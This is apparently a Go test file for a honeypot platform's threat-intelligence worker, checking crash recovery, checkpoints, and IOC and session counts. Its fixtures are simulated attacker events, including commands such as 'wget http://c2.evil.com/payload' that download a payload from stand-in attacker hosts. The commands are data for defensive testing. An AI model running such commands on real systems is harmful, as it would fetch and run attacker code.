package intelligence

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
	"github.com/qpot/qpot/internal/hostsetup"
)

var errDBDown = errors.New("database unavailable")

func wgetEvent(ts time.Time) *database.Event {
	return &database.Event{Honeypot: "cowrie", EventType: "command", SourceIP: "203.0.113.5", Command: "wget http://c2.evil.com/payload", Timestamp: ts}
}

// recoveryDB models durable rows independently of returned event objects and
// worker memory. Faults can happen before a write, after commit (lost reply), or
// midway through projections/tags. Replacing the Worker simulates abrupt exit.
type recoveryDB struct {
	fakeDB
	raw         []*database.Event
	tagged      map[string]bool
	failStage   string
	ambiguous   bool
	partial     bool
	canaryCalls int
}

func recoveryStore(n int) *recoveryDB {
	d := &recoveryDB{tagged: make(map[string]bool)}
	for i := 0; i < n; i++ {
		e := wgetEvent(time.Now().UTC().Add(time.Duration(i) * time.Second))
		e.ID = fmt.Sprint(i + 1)
		d.raw = append(d.raw, e)
	}
	return d
}
func (d *recoveryDB) GetUnclassifiedEvents(_ context.Context, limit int) ([]*database.Event, error) {
	var out []*database.Event
	for _, e := range d.raw {
		if !d.tagged[e.ID] && len(out) < limit {
			cp := *e
			out = append(out, &cp)
		}
	}
	return out, nil
}
func (d *recoveryDB) SaveIntelligenceCheckpoint(ctx context.Context, cp *database.IntelligenceCheckpoint) error {
	stage := "checkpoint"
	if cp.Complete {
		stage = "completion"
	}
	if d.failStage == stage && !d.ambiguous {
		return errDBDown
	}
	if err := d.fakeDB.SaveIntelligenceCheckpoint(ctx, cp); err != nil {
		return err
	}
	if d.failStage == stage {
		return errDBDown
	}
	return nil
}
func (d *recoveryDB) ReplaceIntelligenceIOCs(ctx context.Context, revision uint64, rows []*database.IOC) error {
	if d.failStage == "iocs" {
		if d.partial && len(rows) > 0 {
			_ = d.fakeDB.ReplaceIntelligenceIOCs(ctx, revision, rows[:1])
		}
		if d.ambiguous {
			_ = d.fakeDB.ReplaceIntelligenceIOCs(ctx, revision, rows)
		}
		return errDBDown
	}
	return d.fakeDB.ReplaceIntelligenceIOCs(ctx, revision, rows)
}
func (d *recoveryDB) ReplaceIntelligenceSessions(ctx context.Context, revision uint64, rows []*database.TTPSession) error {
	if d.failStage == "sessions" {
		if d.ambiguous {
			_ = d.fakeDB.ReplaceIntelligenceSessions(ctx, revision, rows)
		}
		return errDBDown
	}
	return d.fakeDB.ReplaceIntelligenceSessions(ctx, revision, rows)
}
func (d *recoveryDB) TagEvent(_ context.Context, e *database.Event) error {
	if d.failStage == "tags" {
		if d.partial && e.ID == "1" {
			d.tagged[e.ID] = true
			return nil
		}
		if d.ambiguous {
			d.tagged[e.ID] = true
		}
		return errDBDown
	}
	d.tagged[e.ID] = true
	return nil
}
func (d *recoveryDB) MatchEvent(context.Context, *database.Event) bool { d.canaryCalls++; return false }
func recoveryWorker(t *testing.T, d *recoveryDB) *Worker {
	t.Helper()
	loader := NewATTCKLoader(t.TempDir())
	loader.loadEmbedded()
	return NewWorker(NewClassifier(loader, NewTTPBuilder(time.Hour)), d, time.Hour, 100).WithCanaryMatcher(d)
}
func assertRecovery(t *testing.T, d *recoveryDB, count int64) {
	t.Helper()
	if len(d.tagged) != len(d.raw) {
		t.Fatalf("tagged %d/%d events", len(d.tagged), len(d.raw))
	}
	if len(d.iocRows) == 0 || len(d.sessionRows) != 1 {
		t.Fatalf("missing derived data: %d IOCs, %d sessions", len(d.iocRows), len(d.sessionRows))
	}
	for _, ioc := range d.iocRows {
		if ioc.Count != count {
			t.Errorf("IOC %s count=%d, want %d", ioc.ID, ioc.Count, count)
		}
	}
	for _, s := range d.sessionRows {
		if s.EventCount != count {
			t.Errorf("TTP count=%d,want %d", s.EventCount, count)
		}
	}
	cp, err := d.LoadIntelligenceCheckpoint(context.Background())
	if err != nil || cp == nil || !cp.Complete {
		t.Fatalf("checkpoint not complete: %+v %v", cp, err)
	}
	if len(cp.Events) > 0 || len(cp.IOCs) > 0 {
		t.Fatal("completed checkpoint retained raw batch")
	}
}

// This matrix protects every boundary, including writes that committed but
// returned an error. No graceful shutdown is invoked between worker instances.
func TestWorkerRecoversDurableCheckpoint(t *testing.T) {
	for _, stage := range []string{"checkpoint", "iocs", "sessions", "tags", "completion"} {
		for _, ambiguous := range []bool{false, true} {
			t.Run(fmt.Sprintf("%s/ambiguous=%v", stage, ambiguous), func(t *testing.T) {
				d := recoveryStore(2)
				d.failStage = stage
				d.ambiguous = ambiguous
				w := recoveryWorker(t, d)
				w.runOnce(context.Background())
				if stage == "checkpoint" || stage == "iocs" || stage == "sessions" {
					if len(d.tagged) > 0 {
						t.Fatal("events tagged before intelligence persisted")
					}
				}
				d.failStage = "" // database survives, process/worker does not
				recoveryWorker(t, d).drain(context.Background())
				assertRecovery(t, d, 2)
				recoveryWorker(t, d).drain(context.Background())
				assertRecovery(t, d, 2)
			})
		}
	}
}

func TestWorkerRecoversPartialWrites(t *testing.T) {
	for _, stage := range []string{"iocs", "tags"} {
		t.Run(stage, func(t *testing.T) {
			d := recoveryStore(2)
			d.failStage = stage
			d.partial = true
			recoveryWorker(t, d).runOnce(context.Background())
			d.failStage = ""
			recoveryWorker(t, d).drain(context.Background())
			assertRecovery(t, d, 2)
		})
	}
}

func TestWorkerRetriesExactCheckpointInProcess(t *testing.T) {
	d := recoveryStore(2)
	d.failStage = "checkpoint"
	d.ambiguous = true
	w := recoveryWorker(t, d)
	w.runOnce(context.Background())
	original := append([]byte(nil), d.checkpointData...)
	w.runOnce(context.Background())
	if string(original) != string(d.checkpointData) {
		t.Fatal("ambiguous checkpoint retry changed payload or revision")
	}
	d.failStage = "tags"
	w.runOnce(context.Background())
	calls := d.canaryCalls
	w.runOnce(context.Background())
	if d.canaryCalls != calls {
		t.Fatal("retry rescanned canaries in same process")
	}
	d.failStage = ""
	w.runOnce(context.Background())
	assertRecovery(t, d, 2)
}

func TestWorkerRestoresActiveSessionAfterRestart(t *testing.T) {
	d := recoveryStore(1)
	recoveryWorker(t, d).runOnce(context.Background())
	var id string
	for k := range d.sessionRows {
		id = k
	}
	e := wgetEvent(d.raw[0].Timestamp.Add(time.Minute))
	e.ID = "2"
	d.raw = append(d.raw, e)
	recoveryWorker(t, d).runOnce(context.Background())
	assertRecovery(t, d, 2)
	if d.sessionRows[id] == nil {
		t.Fatal("restart split an active TTP session")
	}
}

func TestWorkerPersistsSessionsBeforeTagging(t *testing.T) {
	d := recoveryStore(1)
	w := recoveryWorker(t, d)
	w.runOnce(context.Background())
	if len(d.sessionRows) != 1 {
		t.Fatal("active session depends on shutdown/expiration to persist")
	}
	w.classifier.ttpBuilder.inactivityWindow = -time.Hour
	w.flush(context.Background())
	if len(w.classifier.ttpBuilder.GetActiveSessions()) != 0 {
		t.Fatal("expired session retained in memory")
	}
	assertRecovery(t, d, 1)
}

func TestWorkerOutageDoesNotDiscardBacklog(t *testing.T) {
	d := recoveryStore(205)
	d.failStage = "iocs"
	w := recoveryWorker(t, d)
	for i := 0; i < 5; i++ {
		w.drain(context.Background())
	}
	if len(d.tagged) != 0 {
		t.Fatal("outage acknowledged events")
	}
	if len(w.pending.Events) != 100 {
		t.Fatalf("pending batch grew to %d instead of applying backpressure", len(w.pending.Events))
	}
	d.failStage = ""
	recoveryWorker(t, d).drain(context.Background())
	assertRecovery(t, d, 205)
}

func TestWorkerRejectsCorruptSessionCheckpoint(t *testing.T) {
	d := recoveryStore(1)
	data, _ := json.Marshal(&database.IntelligenceCheckpoint{Revision: 2, Complete: true, State: json.RawMessage(`{"bad":{}}`)})
	d.checkpointData = data
	recoveryWorker(t, d).runOnce(context.Background())
	if len(d.tagged) != 0 || len(d.iocRows) != 0 {
		t.Fatal("corrupt recovery state did not fail closed")
	}
}

func TestWorkerCheckpointWithoutTTPBuilder(t *testing.T) {
	d := recoveryStore(1)
	w := recoveryWorker(t, d)
	w.classifier.ttpBuilder = nil
	w.runOnce(context.Background())
	if len(d.tagged) != 1 || len(d.iocRows) == 0 {
		t.Fatal("nil TTP builder prevented IOC processing")
	}
}

func TestWorkerIOCBaselineUsesExactKeys(t *testing.T) {
	d := recoveryStore(1)
	d.iocRows = make(map[string]*database.IOC)
	for i := 0; i < 1100; i++ {
		id := fmt.Sprintf("%04d", i)
		d.iocRows[id] = &database.IOC{ID: id, Type: "ip", Value: "203.0.113.5", Honeypot: id, Count: 9}
	}
	d.iocRows["zzzz"] = &database.IOC{ID: "zzzz", Type: "ip", Value: "203.0.113.5", Honeypot: "cowrie", Count: 7}
	w := recoveryWorker(t, d)
	got, err := w.prepareIOCs(context.Background(), []*database.IOC{{ID: "wanted", Type: "ip", Value: "203.0.113.5", Honeypot: "cowrie", Count: 1}})
	if err != nil || len(got) != 1 || got[0].Count != 8 {
		t.Fatalf("truncated baseline: %+v %v", got, err)
	}
}

func TestWorkerDoesNotReclassifyCanaryOwnedRows(t *testing.T) {
	d := recoveryStore(1)
	canary := &database.Event{ID: "2", Honeypot: "canary", Timestamp: time.Now(), SourceIP: "203.0.113.9", EventType: "canary_trip", Command: "wget http://evil.test/x", TechniqueID: "T1078.004", Confidence: 1}
	d.raw = append(d.raw, canary)
	w := recoveryWorker(t, d)
	w.runOnce(context.Background())
	if !d.tagged["2"] {
		t.Fatal("legacy canary row was not acknowledged")
	}
	if canary.TechniqueID != "T1078.004" {
		t.Fatal("canary policy tag was overwritten")
	}
	for _, ioc := range d.iocRows {
		if ioc.Honeypot == "canary" {
			t.Fatal("worker took ownership of direct canary IOCs")
		}
	}
	if d.canaryCalls != 1 {
		t.Fatalf("matcher called %d times, want only normal event", d.canaryCalls)
	}
	for _, session := range d.sessionRows {
		if session.EventCount != 1 {
			t.Fatal("canary row was counted in worker TTP state")
		}
	}
}

func TestWorkerErrorCodesAndCauses(t *testing.T) {
	cases := map[string]string{"checkpoint": CodeCheckpoint, "iocs": CodeReplay, "sessions": CodeReplay, "tags": CodeReplay, "completion": CodeCheckpoint}
	for stage, code := range cases {
		t.Run(stage, func(t *testing.T) {
			d := recoveryStore(1)
			d.failStage = stage
			w := recoveryWorker(t, d)
			w.runOnce(context.Background())
			var coded *hostsetup.Error
			if !errors.As(w.LastError(), &coded) || coded.Code != code {
				t.Fatalf("error=%v,want %s", w.LastError(), code)
			}
			if !errors.Is(w.LastError(), errDBDown) {
				t.Fatal("coded error lost wrapped cause")
			}
			d.failStage = ""
			w.runOnce(context.Background())
			if w.LastError() != nil {
				t.Fatal("successful retry did not clear error")
			}
		})
	}
}

type encodingFailureDB struct {
	*recoveryDB
	stage string
	err   error
}

func (d *encodingFailureDB) ReadIntelligenceIOCs(ctx context.Context, rows []*database.IOC) ([]*database.IOC, error) {
	if d.stage == "baseline" {
		return nil, d.err
	}
	return d.recoveryDB.ReadIntelligenceIOCs(ctx, rows)
}

func (d *encodingFailureDB) ReplaceIntelligenceIOCs(ctx context.Context, revision uint64, rows []*database.IOC) error {
	if d.stage == "iocs" {
		return d.err
	}
	return d.recoveryDB.ReplaceIntelligenceIOCs(ctx, revision, rows)
}

func (d *encodingFailureDB) ReplaceIntelligenceSessions(ctx context.Context, revision uint64, rows []*database.TTPSession) error {
	if d.stage == "sessions" {
		return d.err
	}
	return d.recoveryDB.ReplaceIntelligenceSessions(ctx, revision, rows)
}

func TestWorkerEncodingFailurePreservesSourceAndRecoveryState(t *testing.T) {
	for _, stage := range []string{"baseline", "iocs", "sessions"} {
		t.Run(stage, func(t *testing.T) {
			base := recoveryStore(1)
			const payload = "wget http://bad.example/\xff.txt"
			base.raw[0].Payload = []byte(payload)
			cause := &database.IntelligenceEncodingError{Backend: "timescaledb", Field: "ioc.value", Reason: "invalid UTF-8"}
			db := &encodingFailureDB{recoveryDB: base, stage: stage, err: fmt.Errorf("storage validation: %w", cause)}
			worker := recoveryWorker(t, base)
			worker.db = db
			for attempt := 0; attempt < 2; attempt++ {
				worker.runOnce(context.Background())
				var coded *hostsetup.Error
				if !errors.As(worker.LastError(), &coded) || coded.Code != CodeEncoding || !errors.Is(worker.LastError(), cause) {
					t.Fatalf("encoding error must retain actionable code and cause: %v", worker.LastError())
				}
				if len(base.tagged) != 0 || base.raw[0].Classified || string(base.raw[0].Payload) != payload {
					t.Fatal("unsupported string was acknowledged or its source bytes rewritten")
				}
				checkpoint, err := base.LoadIntelligenceCheckpoint(context.Background())
				if err != nil {
					t.Fatal(err)
				}
				if stage == "baseline" {
					if checkpoint != nil || len(worker.classifier.ttpBuilder.GetActiveSessions()) != 0 {
						t.Fatal("failed baseline advanced checkpoint or session state")
					}
				} else if checkpoint == nil || checkpoint.Complete || len(checkpoint.Events) != 1 || string(checkpoint.Events[0].Payload) != payload {
					t.Fatal("failed projection discarded or rewrote pending recovery data")
				}
			}
			// Model a storage capability repair, not normalization or skipping:
			// the same exact data must then finish with counts applied once.
			db.stage = ""
			worker.runOnce(context.Background())
			if worker.LastError() != nil {
				t.Fatalf("resolved encoding failure remained active: %v", worker.LastError())
			}
			assertRecovery(t, base, 1)
		})
	}
}

type recoveryReadFailureDB struct {
	*recoveryDB
	failLoad, failBaseline bool
}

func (d *recoveryReadFailureDB) LoadIntelligenceCheckpoint(ctx context.Context) (*database.IntelligenceCheckpoint, error) {
	if d.failLoad {
		return nil, errDBDown
	}
	return d.recoveryDB.LoadIntelligenceCheckpoint(ctx)
}
func (d *recoveryReadFailureDB) ReadIntelligenceIOCs(ctx context.Context, rows []*database.IOC) ([]*database.IOC, error) {
	if d.failBaseline {
		return nil, errDBDown
	}
	return d.recoveryDB.ReadIntelligenceIOCs(ctx, rows)
}

func TestWorkerReadFailuresPreserveReplayState(t *testing.T) {
	for _, stage := range []string{"load", "baseline"} {
		t.Run(stage, func(t *testing.T) {
			base := recoveryStore(1)
			d := &recoveryReadFailureDB{recoveryDB: base, failLoad: stage == "load", failBaseline: stage == "baseline"}
			w := recoveryWorker(t, base)
			w.db = d
			w.runOnce(context.Background())
			code := CodePreparation
			if stage == "load" {
				code = CodeRecovery
			}
			var coded *hostsetup.Error
			if !errors.As(w.LastError(), &coded) || coded.Code != code {
				t.Fatalf("error=%v,want %s", w.LastError(), code)
			}
			if len(base.tagged) != 0 || len(base.iocRows) != 0 {
				t.Fatal("failed read advanced processing")
			}
			if len(w.classifier.ttpBuilder.GetActiveSessions()) != 0 {
				t.Fatal("failed preparation retained counted events")
			}
			d.failLoad = false
			d.failBaseline = false
			w.runOnce(context.Background())
			assertRecovery(t, base, 1)
		})
	}
}

func TestWorkerCrashPreservesBinaryIndicatorIdentity(t *testing.T) {
	ctx := context.Background()
	d := recoveryStore(0)
	for n, username := range []string{"root\xff", "root�"} {
		d.raw = append(d.raw, &database.Event{ID: fmt.Sprint(n + 1), Honeypot: "cowrie", EventType: "login", SourceIP: "203.0.113.5", Username: username, Password: "password", Timestamp: time.Now().UTC(), Metadata: map[string]string{"user_agent": "tool:" + username}})
	}
	d.failStage = "sessions"
	recoveryWorker(t, d).runOnce(ctx)
	d.failStage = ""
	recoveryWorker(t, d).drain(ctx)
	creds := map[string]int64{}
	for _, ioc := range d.iocRows {
		if ioc.Type == "credential" {
			creds[ioc.ID] = ioc.Count
		}
	}
	if len(creds) != 2 || creds["credential:root\xff:password:cowrie"] != 1 || creds["credential:root�:password:cowrie"] != 1 {
		t.Fatalf("crash changed distinct identities: %v", creds)
	}
	// A later batch must find the same raw baseline and restored session, not
	// create a normalized key or silently reset/double the original count.
	e := *d.raw[0]
	e.ID = "3"
	d.raw = append(d.raw, &e)
	recoveryWorker(t, d).drain(ctx)
	for _, ioc := range d.iocRows {
		if ioc.ID == "credential:root\xff:password:cowrie" && ioc.Count != 2 {
			t.Fatalf("raw credential count=%d", ioc.Count)
		}
	}
	// One source is one session, whatever its user agents and usernames: the
	// three events, each counted once across the crash and the restores.
	if len(d.sessionRows) != 1 {
		t.Fatalf("one source was stored as %d sessions", len(d.sessionRows))
	}
	for _, s := range d.sessionRows {
		if s.EventCount != 3 {
			t.Fatalf("restored session counts %d events, want 3", s.EventCount)
		}
	}
}
